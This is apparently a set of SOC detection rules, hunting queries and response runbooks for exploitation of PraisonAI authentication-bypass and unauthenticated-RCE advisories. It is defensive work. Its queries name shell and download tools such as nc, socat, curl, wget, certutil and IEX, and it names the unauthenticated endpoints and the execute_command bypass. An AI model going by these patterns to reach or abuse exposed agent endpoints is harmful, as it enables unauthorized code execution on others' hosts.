DeviceProcessEvents | where Timestamp > ago(7d) | where InitiatingProcessCommandLine has_any ("praisonai ui", "praisonai claw", "aiui run", "praisonaiui.server", "create_host_app", "build_host_app") | where FileName !in~ ("python.exe","python3","python3.exe","python3.10","python3.11","python3.12","conhost.exe","uvicorn","uvicorn.exe","node.exe") | project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine | order by Timestamp desc
SecurityEvent | where TimeGenerated > ago(7d) | where EventID == 4688 | where ParentProcessName has_any ("python","uvicorn","praisonai","aiui") | where ParentProcessName has_any ("praisonai","aiui") or CommandLine has_any ("praisonai","aiui","praisonaiui") | where not (NewProcessName endswith "python.exe" or NewProcessName endswith "python3" or NewProcessName endswith "conhost.exe" or NewProcessName endswith "uvicorn.exe") | project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName | order by TimeGenerated desc

PraisonAI AgentOS launched with 0.0.0.0 bind exposing unauthenticated /api/chat (CVE-2026-40151) AIWeaponization High
Detects a Python/uvicorn process launching PraisonAI AgentOS or AgentApp with the default `host=0.0.0.0` bind, which exposes the unauthenticated `/api/agents` and `/api/chat` routes named in GHSA-892r-p3jq-jp24. The detection fires on the vulnerable configuration regardless of patch level because v4.5.128 through v4.6.57 still register routes without auth. Rationale: Anchors on the article's named binding (`host: str = "0.0.0.0"`), package import strings (`praisonai`, `AgentApp`, `AgentOS`, `AgentOSConfig`), and the Python/uvicorn launcher implied by the FastAPI deployment. Combining all three string classes in one process record is near-zero FP outside intentional PraisonAI deployments. Cross-checked against: • https://radar.offseq.com/threat/cve-2026-40151-cwe-200-exposure-of-sensitive-infor-41548a8f • https://vulnerability.circl.lu/vuln/ghsa-892r-p3jq-jp24 • https://thehackernews.com/2026/05/praisonai-cve-2026-44338-auth-bypass.html
ATT&CKT1190 T1133
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer running PraisonAI locally with --host 0.0.0.0 for container/VM testing
  • Authorized PraisonAI deployment behind nginx/ALB with mTLS terminating in front of the FastAPI app
  • CI/CD smoke-test pipelines launching the vulnerable demo configuration for integration tests
  • Data science notebook environments where 0.0.0.0 is used so Jupyter cells can reach the local service
Suppression filter
| where InitiatingProcessCommandLine !has "pytest" and InitiatingProcessCommandLine !has "--reload" and InitiatingProcessFolderPath !contains "\\.tox\\" and InitiatingProcessFolderPath !contains "site-packages\\pytest"
Response runbook
Triage: pull the full ProcessCommandLine plus parent (uvicorn? gunicorn? bare python?) and check `pip show praisonai` on the host — anything 4.2.1 ≤ ver ≤ 4.6.57 is vulnerable per the advisory. Identify which agents are registered via `GET /api/agents` from a trusted source. Contain: firewall block inbound to TCP/8000 from non-corporate ranges immediately; coordinate with service owner to either restart with `host=127.0.0.1` or front the service with an authenticating proxy (matches PraisonAI's own hardened deploy-API pattern). Hunt: pivot to UC2 for any historical inbound hits on /api/chat or /api/agents from public IPs; sweep DeviceInfo / IdentityInfo for other hosts running praisonai (`pip ls | grep praisonai` via live response) to find sibling exposed instances.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("python.exe","python3.exe","pythonw.exe","uvicorn.exe","python","python3","uvicorn")
| where ProcessCommandLine has_any ("praisonai","AgentApp","AgentOS","agentos","AgentOSConfig","AgentAppConfig")
| where ProcessCommandLine has "0.0.0.0"
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath
| order by Timestamp desc
union isfuzzy=true
  (SecurityEvent
   | where TimeGenerated > ago(7d)
   | where EventID == 4688
   | where NewProcessName has_any ("python.exe","pythonw.exe","uvicorn.exe")
   | where CommandLine has_any ("praisonai","AgentApp","AgentOS","agentos")
   | where CommandLine has "0.0.0.0"
   | project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName),
  (ImProcessCreate
   | where TimeGenerated > ago(7d)
   | where ActingProcessName has_any ("python","uvicorn")
   | where ActingProcessCommandLine has_any ("praisonai","AgentApp","AgentOS","agentos")
   | where ActingProcessCommandLine has "0.0.0.0"
   | project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName)
| order by TimeGenerated desc

description: Detects PraisonAI AgentOS / AgentApp launched with host=0.0.0.0, exposing unauthenticated /api/chat and /api/agents endpoints across v4.2.1 through v4.6.57 (GHSA-892r-p3jq-jp24).

source:(windows.sysmon OR linux.auditd) (@EventID:1 OR @auditd.type:EXECVE) (@Image:(*\python.exe OR *\Python.exe OR *\python3.exe OR *\uvicorn.exe) OR @process.executable.path:(*/python OR */python3 OR */uvicorn)) (@CommandLine:(*praisonai* OR *AgentApp* OR *AgentOS* OR *agentos*) OR @process.command_line:(*praisonai* OR *AgentApp* OR *AgentOS* OR *agentos*)) (@CommandLine:*0.0.0.0* OR @process.command_line:*0.0.0.0*)

Unauthenticated POST to PraisonAI /api/chat from external network (CVE-2026-40151 exploitation) AIExploitation Medium
Detects inbound HTTP requests to the PraisonAI AgentOS `/api/chat` or `/api/agents` paths from public/non-corporate sources, optionally without a valid Authorization header. Active in-the-wild scanning of PraisonAI auth-bypass CVEs has been documented within hours of disclosure, so any external hit to these routes is high-fidelity post-compromise reconnaissance or unauthorized agent invocation. Rationale: Anchors directly on the two route strings the advisory's PoV proves are vulnerable (`GET /api/agents`, `POST /api/chat`) plus the default port `8000` and the `python/uvicorn` server process. Joining the inbound network event to a process whose cmdline contains `praisonai` removes the FP risk of any other service that happens to listen on 8000. External-source filter keeps internal pen-test / health-check traffic out. Cross-checked against: • https://thehackernews.com/2026/05/praisonai-cve-2026-44338-auth-bypass.html • https://cybersecuritynews.com/praisonai-vulnerability-exploited/ • https://www.csoonline.com/article/4171215/praisonai-vulnerability-gets-scanned-within-4-hours-of-disclosure.html • https://www.brinztech.com/breach-alerts/brinztech-ai-infrastructure-alert-authentication-evasion-broken-access-controls-and-automated-agent-manipulation-the-in-the-wild-scanning-exploitation-loop-of-praisonai-cve-2026-44338
ATT&CKT1190 T1078 T1106
Data sourcesWeb.Web Network_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authorized external pentest hitting the documented vulnerable endpoint as part of attack-surface validation
  • Vendor-run vulnerability scanners (Qualys, Tenable, Rapid7) issuing CVE-2026-40151 / CVE-2026-44338 detection probes
  • Cloud-provider managed health probes (AWS ELB, GCP LB) hitting /api/agents if mis-configured as a health-check path
  • Internal API gateway that NAT-translates internal traffic to a public-looking egress IP
Suppression filter
| where RemoteIP !in (dynamic(["<authorized_scanner_ip_1>","<authorized_scanner_ip_2>"])) and not(InitiatingProcessCommandLine has_any ("pytest","--reload","tests/"))
Response runbook
Triage: was the request answered with HTTP 200 and did the host's PraisonAI version fall in 4.2.1 – 4.6.57? If yes, treat as confirmed unauthorized invocation, not a probe. Pull the request body if WAF logs include it — the `message` field reveals what the attacker asked the agent to do (data exfil prompt, tool invocation, prompt injection chain). Contain: immediate firewall block of the source IP at perimeter; revoke any LLM / vector-DB / tool API keys the deployed agent has access to (they should be considered burned); restart the service bound to 127.0.0.1 behind an authenticating reverse proxy. Hunt: enumerate which agents and tools were registered (config files + `GET /api/agents` response if logged), then audit downstream systems those tools could touch (cloud APIs, vector DB, email integrations, browser-actions) for activity correlating with the inbound timestamps. Sweep for sibling exposed PraisonAI instances using UC1.

PraisonAI AgentTeam.launch / Agents.launch bound to 0.0.0.0 (GHSA-x8cv-xmq7-p8xp) AIDelivery High
Hunts Python processes invoking PraisonAI's AgentTeam/Agents.launch() with a non-loopback bind host, which exposes the unauthenticated GET /{path}/list and POST /{path}[/agent_id] FastAPI routes documented in GHSA-x8cv-xmq7-p8xp. Any external bind of this launch path is functionally a remote unauthenticated agent-execution endpoint. Rationale: Anchors on the exact API names called out in the advisory (AgentTeam.launch / Agents.launch / praisonaiagents) combined with the documented vulnerable default host=0.0.0.0 bind. Cross-checked against the GHSA advisory text and src/praisonai-agents/praisonaiagents/agents/agents.py line references in the report (1923, 2007, 2042, 2086, 2117). Cross-checked against: • https://github.com/advisories/GHSA-x8cv-xmq7-p8xp • https://github.com/MervinPraison/PraisonAI
ATT&CKT1190 T1059.006
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer running PraisonAI samples locally with host=0.0.0.0 on a workstation behind NAT
  • CI/CD pipeline exercising AgentTeam.launch integration tests with a wildcard bind
  • Internal demo/POC of PraisonAI in a sandbox VM where 0.0.0.0 is intentional
  • Documentation walk-through where engineers copy/paste the official host=0.0.0.0 example
  • Containerised PraisonAI deployments where binding to 0.0.0.0 inside the container is required but reverse-proxy-fronted
Suppression filter
| where DeviceName !has "dev-" and DeviceName !has "build-" and not (InitiatingProcessFileName in~ ("pytest.exe","tox.exe") or ProcessCommandLine has_any ("pytest","tox","-m unittest"))
Response runbook
Step 1 (triage): Identify the host, user, and full command line; confirm whether the process is listening on a non-loopback interface (netstat / Get-NetTCPConnection on LocalPort from the alert) and whether the AgentTeam path is reachable from outside the host. Pivot on InitiatingProcessCommandLine to see how it was launched (cron, systemd, supervisor, manual). Step 2 (contain): If the listener is externally reachable, block the listening port at the host firewall and stop the process; have the owner pin praisonaiagents to a patched release or wrap launch() with an auth proxy / bind to 127.0.0.1. Step 3 (hunt): Search DeviceNetworkEvents / proxy logs for inbound GET /*/list and POST /* to that host's LocalPort over the prior 30 days to identify any pre-existing unauthenticated invocations, and pivot on the agent display names returned by /list against any IOC for prompt-injection or data-exfil follow-on activity.

Unauthenticated GET /{path}/list and POST hits to PraisonAI agent route AIExploitation Medium
Hunts inbound HTTP traffic to the PraisonAI FastAPI route shape (GET <path>/list, POST <path>, POST <path>/<agent_id>) served by a Python/uvicorn process, with no Authorization header or a non-matching bearer. The advisory confirms the routes accept requests with no Authorization or an arbitrary bearer, so any cross-host hit to this shape is a candidate for unauthenticated agent invocation. Rationale: Pivots on the exact three-route shape registered by AgentTeam.launch (GET {path}/list, POST {path}, POST {path}/{agent_id}) and constrains to hosts where a praisonaiagents-Python process was observed. Inbound IIS/web-proxy view catches the unauthenticated request even when the host log lacks an Authorization header, mirroring the PoV's case names no_auth_list / no_auth_group / wrong_bearer_group / no_auth_per_agent. Cross-checked against: • https://github.com/advisories/GHSA-x8cv-xmq7-p8xp
ATT&CKT1190 T1133
Data sourcesNetwork_Traffic.All_Traffic Web.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Internal API gateway or service-mesh health probe hitting /list on the agent port
  • Developer using curl/httpie to test the agent endpoint from another workstation
  • Authorised red-team validating the very GHSA-x8cv-xmq7-p8xp finding
  • Kubernetes liveness/readiness probe configured against the agent listener
  • Internal documentation tools (e.g. Swagger UI bookmarks) issuing the route-shape requests
Suppression filter
| where cIP !in ("10.0.0.10","10.0.0.11") and csUserAgent !has_any ("kube-probe","GoogleHC","ELB-HealthChecker","Datadog Agent","Pingdom")
Response runbook
Step 1 (triage): Confirm the destination host is running PraisonAI and that the request originated from outside the host's loopback; correlate the source IP against known internal automation, reverse-proxy egress IPs, or unknown external scanners. Pull the responding process command line and request body if a WAF/proxy captured it. Step 2 (contain): Restrict the agent port to loopback (firewall rule or relaunch with host=127.0.0.1), front the service with an authenticating reverse proxy, and pin praisonaiagents to a patched release once available. Step 3 (hunt): Search 30 days of proxy/IIS/NGINX logs for any source IP that fetched /list followed by a POST to the same path or to /<agent_id>, then pivot on the responses for sensitive tool / prompt content that may have been exposed; review AgentTeam tool definitions for any with credentials, file-write, or shell-exec capabilities and treat those hosts as scoped incidents.

let BadHashes = dynamic(["10b5deab96686f276b8ad71fa4712e1e3d301e4c356812d5d0d595b2b9503ef3", "869564d523c14624afefb211a2e7c6bf8a27b3356bd19a58927fcb5e1ebb014c"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Unauthenticated POST to PraisonAI /runs endpoint (recipe-serve auth bypass exploitation) AIExploitation Medium
Hunts HTTP POST requests to the praisonai recipe-serve endpoints (/runs, /recipes, /invoke) that return 2xx without an X-API-Key or Authorization header — the exact request shape that exercises the GHSA-j4hj-7hfh-g2f4 silent-bypass branch in APIKeyAuthMiddleware/JWTAuthMiddleware. Article-specific because it pivots on praisonai's documented route and the auth-header absence that drives the fail-open branch. Rationale: Targets the exact request shape exercised by the PoC (POST /runs with empty X-API-Key / Authorization headers) — the article quotes `serve.py:325-333` accepting these as authenticated when the secret is unset. Pivots on auth-header absence rather than the praisonai 4.6.48 hash so it catches operators on any sub-version of the same fail-open branch. Cross-checked against: • https://github.com/MervinPraison/PraisonAI • https://github.com/advisories/GHSA-j4hj-7hfh-g2f4
ATT&CKT1190 T1078
Data sourcesWeb.Web
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate operator-issued POST /runs traffic from internal automation that intentionally runs unauth (operator accepted the risk)
  • Health-check probes from load balancers hitting recipe routes (rare — usually /health)
  • Internal CI/CD pipelines invoking praisonai recipes without auth headers
  • Scanner traffic from authorised internal vulnerability scans
  • Reverse-proxy stripping the X-API-Key header before logging (logging gap, not actual bypass)
Suppression filter
| where DvcHostname !in ("<internal-ci-runner-fqdn>","<praisonai-internal-test-host>") and SrcIpAddr !in ("<lb-health-check-ip>")
Response runbook
1) Triage: pull the request body and Url from the WAF/access log; confirm the praisonai process is listening (`ss -ltnp | grep python`) and inspect its YAML config — if `auth: api-key` is set but `api_key:` field and `PRAISONAI_API_KEY` env var are both absent, the host is vulnerable. 2) Contain: take the praisonai service off the public interface (firewall to localhost or kill the systemd unit), then restart with `PRAISONAI_API_KEY` exported AND `api_key:` set in YAML — or upgrade past 4.6.48 once a fix ships. 3) Hunt: replay the past 30d of access logs for unauthenticated POST /runs requests, pivot on the requesting source IPs into DNS/Network telemetry to spot data exfil or follow-on lateral movement, and pull all recipe-execution outputs to see whether attacker-controlled prompts ran.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where ActionType == "InboundConnectionAccepted"
| where InitiatingProcessFileName in~ ("python.exe","python3.exe","python","python3","uvicorn.exe","gunicorn")
| where InitiatingProcessCommandLine has_any ("praisonai","recipe serve","recipe/serve.py","recipe.serve")
| where RemoteIPType == "Public"
| project Timestamp, DeviceName, RemoteIP, RemotePort, LocalPort,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessParentFileName, InitiatingProcessAccountName
| order by Timestamp desc
ImWebSession
| where TimeGenerated > ago(7d)
| where HttpMethod == "POST"
| where Url matches regex @"(?i)/(runs|recipes|invoke|execute)(\?|/|$)"
| where HttpStatusCode between (200 .. 299)
| where isempty(HttpRequestHeaderAuthorization)
| extend HasApiKeyHeader = HttpRequestHeaderCookie has "x-api-key" or HttpRequestHeaderAuthorization has_any ("Bearer ","Basic ")
| where HasApiKeyHeader == false
| project TimeGenerated, SrcIpAddr, DvcHostname, DstHostname, DstPortNumber, HttpMethod, Url, HttpStatusCode, HttpRequestHeaderUserAgent, HttpRequestHeaderAuthorization
| order by TimeGenerated desc

| groupBy([aid, ComputerName, ContextImageFileName, LocalPort, RemoteAddressIP4], function=count())
| count > 0

PraisonAI recipe-serve Python process spawning shell/code-exec child (post-bypass RCE) AIInstallation Medium
Detects a Python interpreter running praisonai recipe-serve that goes on to spawn cmd/powershell/sh/bash/curl/wget — the post-authentication-bypass RCE path called out in the article's Impact section (recipe execution wired to tools yields direct code execution). Article-specific because it anchors on the parent command line containing `praisonai`/`recipe.serve`/`serve.py`. Rationale: Anchors on the article's documented call-site `auth_type = config.get("auth")` and the recipe-serve module path (`praisonai/recipe/serve.py`) — any Python process whose command line carries that path or the `praisonai recipe serve` CLI invocation, then spawns a shell/download utility, is by definition either the operator running an attacker-controlled recipe payload or the result of the unauth /runs POST in UC1. Cross-checked against: • https://github.com/MervinPraison/PraisonAI • https://github.com/advisories/GHSA-j4hj-7hfh-g2f4
ATT&CKT1059 T1190 T1505.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate praisonai recipes that intentionally shell out for build/deploy automation (operator-authored)
  • Recipe debugging by the operator from a local terminal
  • Health/readiness probes that invoke a curl sub-process from inside the recipe-serve container
  • Periodic cron tasks bundled into the same container that use python+sh
  • Init-container patterns where the praisonai entrypoint script bootstraps via sh -c
Suppression filter
| where not (ActingProcessCommandLine has_any ("healthcheck","readiness","liveness") and TargetProcessCommandLine has_any ("curl -sf http://localhost","curl -fsS http://127.0.0.1"))
Response runbook
1) Triage: pull the parent Python command line and the child's command line/SHA256 from the EDR event; cross-reference the YAML recipe definitions on the host (`config.get("auth")` block per the article) — if the operator's recipes do not legitimately shell out, the child is hostile. 2) Contain: isolate the host, snapshot the praisonai working directory and the in-flight recipe inputs (the article notes operator prompts/LLM responses are reachable), then kill the recipe-serve process and revoke any service credentials it could touch. 3) Hunt: walk the process tree forward from the spawned shell looking for outbound C2, credential access, or new persistence; query UC1 for the unauth /runs POST that preceded this spawn within a 60-second window to confirm the attack chain.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("python.exe","python3.exe","python","python3","uvicorn.exe","gunicorn")
| where InitiatingProcessCommandLine has_any ("praisonai","recipe serve","recipe/serve.py","recipe.serve","-m praisonai")
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","sh","bash","dash","curl.exe","curl","wget.exe","wget","nc.exe","ncat.exe","certutil.exe","bitsadmin.exe")
    or ProcessCommandLine has_any ("/bin/sh -c","/bin/bash -c","Invoke-Expression","IEX (","DownloadString","base64 -d","python -c")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd = InitiatingProcessCommandLine,
          ChildImage = FolderPath,
          ChildCmd = ProcessCommandLine,
          SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName matches regex @"(?i)\b(python3?|uvicorn|gunicorn)(\.exe)?$"
| where ActingProcessCommandLine has_any ("praisonai","recipe serve","recipe/serve.py","recipe.serve","-m praisonai")
| where TargetProcessName matches regex @"(?i)\b(sh|bash|dash|cmd\.exe|powershell\.exe|pwsh\.exe|curl(\.exe)?|wget(\.exe)?|nc(\.exe)?|ncat(\.exe)?|certutil\.exe|bitsadmin\.exe)$"
    or TargetProcessCommandLine has_any ("/bin/sh -c","/bin/bash -c","Invoke-Expression","IEX (","DownloadString","base64 -d")
| where ActorUsername !endswith "$"
| project TimeGenerated, DvcHostname, ActorUsername,
          ParentImage = ActingProcessName,
          ParentCmd = ActingProcessCommandLine,
          ChildImage = TargetProcessName,
          ChildCmd = TargetProcessCommandLine,
          SHA256
| order by TimeGenerated desc

        | where AccountName !endswith "$"
        | where SHA256 in~ ("491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23") or SHA1 in~ ("491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23") or MD5 in~ ("491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["491bf8f29e399418260810ba4bf0f6802c6e4aa675628e2be68a9726c15d9b23"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] PraisonAI unauthenticated Jobs API request (POST /api/v1/runs) · Article-specific behavioural hunt — [GHSA / CRITICAL] GHSA-4869-x4pr-q22x: PraisonAI: Unauthenticated RCE via Jobs A
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] PraisonAI workflow runtime spawning shell/curl/wget child (RCE manifestation)
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Unexpected egress from PraisonAI host to non-LLM destination
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
PraisonAI unauthenticated Jobs API request (POST /api/v1/runs) AIExploitation High
Detects inbound HTTP POST requests to the PraisonAI Jobs API endpoint `/api/v1/runs` (default port 8005), which lacks `Depends(verify_token)` and is exploitable for unauthenticated RCE per GHSA-4869-x4pr-q22x. Pre-positions a perimeter alert before the LLM-driven execute_command stage fires on the host. Rationale: Anchored on the exact endpoint string `/api/v1/runs` and default port `8005` named in the GHSA PoC. Cross-checked against Sysdig's CVE-2026-44338 writeup and gbhackers reporting on rapid PraisonAI exploitation — the same Jobs API attack surface is in active scan-and-exploit campaigns, so any inbound POST from a public source IP to this path is high-fidelity. Cross-checked against: • https://github.com/advisories/GHSA-4869-x4pr-q22x • https://www.sysdig.com/blog/cve-2026-44338-praisonai-authentication-bypass-in-under-4-hours-and-the-growing-trend-of-rapid-exploitation • https://gbhackers.com/praisonai-vulnerability-actively-exploited/
ATT&CKT1190 T1078
Data sourcesWeb.Web Network_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Internal QA / integration tests hitting the Jobs API from a CI/CD runner with a public NAT egress IP
  • Authorized red-team or pentest reconnaissance during a scheduled engagement
  • Load-balancer or reverse-proxy health probes that NAT through a public IP
  • Legitimate operator triggering a job from a remote IP without VPN
  • Vulnerability scanners (Nessus, Qualys, Rapid7) probing the endpoint
Suppression filter
and not (SrcIpAddr in ("<CI-egress-IP-1>", "<CI-egress-IP-2>")) and not (HttpRequestHeaderUserAgent has_any ("kube-probe", "ELB-HealthChecker", "GoogleHC"))
Response runbook
1) Triage: pull the full request body from proxy/WAF logs and grep for `approve` and `execute_command` in the `agent_yaml` field — presence confirms exploit attempt vs benign call. Identify caller IP, geo-ASN, and whether the source is in any allowed CI/CD egress set. 2) Contain: place the PraisonAI host behind auth (reverse-proxy IP allowlist or mTLS) or take the Jobs API offline; upgrade praisonai > 4.6.48 once patched. Block the caller IP at WAF/perimeter. 3) Hunt: pivot to UC2 (python parent → shell child) and UC3 (egress to non-LLM destinations) on the praisonai host for the ±2h window. Check `~/.bash_history`, `/tmp`, `/var/tmp`, and the praisonai working directory for dropped payloads.
// Defender lacks raw HTTP body — pivot on inbound TCP to the Jobs API port from a public source where the listening process is the praisonai/uvicorn runtime.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where LocalPort == 8005
| where ActionType in ("InboundConnectionAccepted", "ConnectionAccepted", "ListeningConnectionCreated")
| where RemoteIPType == "Public"
| where InitiatingProcessFileName in~ ("python.exe","python","python3","python3.exe","uvicorn","uvicorn.exe","gunicorn")
   or InitiatingProcessCommandLine has_any ("praisonai","praisonai.jobs","uvicorn")
| project Timestamp, DeviceName, RemoteIP, RemotePort, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId
| order by Timestamp desc
ImWebSession
| where TimeGenerated > ago(7d)
| where HttpMethod =~ "POST"
| where Url has "/api/v1/runs"
| where not(ipv4_is_private(SrcIpAddr))
| project TimeGenerated, SrcIpAddr, DstIpAddr, DstPortNumber, Url, HttpMethod, HttpRequestHeaderUserAgent, HttpRequestBodyBytes, EventProduct
| order by TimeGenerated desc
title: Inbound POST to PraisonAI Jobs API /api/v1/runs (unauthenticated RCE)

description: Detects HTTP POST requests to the PraisonAI Jobs API path /api/v1/runs which lacks authentication per GHSA-4869-x4pr-q22x. Default service port is 8005.
references:

  - https://www.sysdig.com/blog/cve-2026-44338-praisonai-authentication-bypass-in-under-4-hours-and-the-growing-trend-of-rapid-exploitation
author: SOC Detection Engineering

  - attack.initial_access

  condition: selection
falsepositives:

level: high
(source:nginx.access OR source:apache.access OR source:envoy OR source:iis) @http.method:POST @http.url_details.path:"/api/v1/runs" -CIDR(@network.client.ip, 10.0.0.0/8) -CIDR(@network.client.ip, 192.168.0.0/16) -CIDR(@network.client.ip, 172.16.0.0/12) -CIDR(@network.client.ip, 127.0.0.0/8)

PraisonAI workflow runtime spawning shell/curl/wget child (RCE manifestation) AIInstallation High
Detects the Python runtime hosting PraisonAI (parent process is python / uvicorn / gunicorn with `praisonai` in its command line) spawning a shell or download utility as a child. Per the advisory, the bypass chain ends at `subprocess.Popen(['curl', ...])` in `shell_tools.py:33` — this is the on-host signal that the YAML `approve: [execute_command]` bypass actually fired. Rationale: Anchored on the exact runtime chain documented in the advisory: `uvicorn`/`python` running praisonai → `subprocess.Popen(["curl", ...])` at `shell_tools.py:33`. The `praisonai` keyword in the parent command line is what suppresses the FP set of generic Python admin scripts shelling out — it's the article-specific delimiter. Cross-checked Sysdig's writeup which describes the same shell-spawn pattern on exploited hosts. Cross-checked against: • https://github.com/advisories/GHSA-4869-x4pr-q22x • https://www.sysdig.com/blog/cve-2026-44338-praisonai-authentication-bypass-in-under-4-hours-and-the-growing-trend-of-rapid-exploitation
ATT&CKT1059.004 T1059.003 T1190 T1105
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Operator running a benign PraisonAI workflow that legitimately uses `web_search` / `run_command` against a known internal endpoint
  • PraisonAI's own LLM-fetching shim calling curl to download a local model artifact at startup
  • Container start-up hook in the praisonai Docker image running curl/wget for entrypoint health-check
  • Developer running praisonai under uvicorn locally and triggering a shell pipeline for testing
  • Autoscaler / Helm chart probes that invoke a sh inside the praisonai pod
Suppression filter
| where not (ProcessCommandLine has_any ("--version", "--help")) | where not (InitiatingProcessCommandLine has_any ("pytest", "--reload")) | where AccountName !endswith "$"
Response runbook
1) Triage: capture the full child `ProcessCommandLine` and look for hallmarks of the GHSA PoC — curl/wget targeting an external URL with shell-substitution output (`?output=`, `?out=`, `uid=`, `$(`). Pivot to UC1 for an inbound POST to /api/v1/runs in the prior 5 minutes. 2) Contain: kill the parent python/uvicorn PID, take the host off the network, snapshot memory and `/tmp`. Rotate any OPENAI/ANTHROPIC API keys and other secrets reachable from the praisonai process environment. 3) Hunt: enumerate all child processes of the parent PID for the last 30 days; check `crontab`, `~/.ssh/authorized_keys`, `/etc/systemd/system/*.service`, and the praisonai working directory for persistence. Sweep the network for outbound to the attacker URL identified in step 1.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("python.exe","python","python3","python3.exe","uvicorn","uvicorn.exe","gunicorn")
| where InitiatingProcessCommandLine has_any ("praisonai","praisonai.jobs","praisonaiagents","praisonai/api","uvicorn")
| where FileName in~ ("curl","curl.exe","wget","wget.exe","sh","bash","dash","zsh","cmd.exe","powershell.exe","pwsh","pwsh.exe","nc","ncat","socat")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("python","uvicorn","gunicorn")
| where ParentProcessCommandLine has_any ("praisonai","praisonai.jobs","praisonaiagents","uvicorn")
| where TargetProcessName has_any ("curl","wget","/sh","/bash","/dash","/zsh","cmd.exe","powershell.exe","pwsh","nc","ncat","socat")
| extend ChildBin = tostring(split(TargetProcessName, "/")[-1])
| project TimeGenerated, DvcHostname, ActorUsername,
          ParentProcessName, ParentProcessCommandLine,
          TargetProcessName, TargetProcessCommandLine, ChildBin
| order by TimeGenerated desc

Unexpected egress from PraisonAI host to non-LLM destination AICommand & Control Medium
